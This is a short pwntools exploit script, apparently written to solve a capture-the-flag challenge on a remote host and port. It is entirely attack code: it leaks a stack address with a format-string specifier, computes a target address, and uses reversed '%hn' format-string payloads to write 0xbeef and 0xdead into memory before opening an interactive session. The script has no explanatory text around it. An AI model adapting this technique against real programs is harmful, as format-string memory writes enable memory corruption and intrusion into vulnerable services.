#!/usr/bin/python3

from pwn import *
exe = ELF('./chal', checksec=False)

# p = process(exe.path)
p = remote('23.146.248.230', 12321)
# gdb.attach(p, gdbscript='''
# b *main+166
# c
# ''')
def slog(name, addr): 
	return success(': '.join([name, hex(addr)]))
payload = f"%13$p"[::-1].encode()
p.sendlineafter(b'String: ', payload)
st_leak = int(p.recvline()[:-1], 16)
target = st_leak-0x11c

slog('exe_leak:', st_leak)
slog('target: ', target)

target_low_2b = target & 0xffff

# payload = b'%' + str(target_low_2b).encode() + b'c%13$hn'
payload = f'%{target_low_2b}c%13$hn'.encode()[::-1]
p.sendlineafter(b'String: ', payload)

slog('target_low_2b: ', target_low_2b)
payload = f'%{0xbeef}c%43$hn'.encode()[::-1]
p.sendlineafter(b'String: ', payload)

payload = f'%{target_low_2b + 2}c%13$hn'.encode()[::-1]
p.sendlineafter(b'String: ', payload)

payload = f'%{0xdead}c%43$hn'.encode()[::-1]
p.sendlineafter(b'String: ', payload)
p.interactive()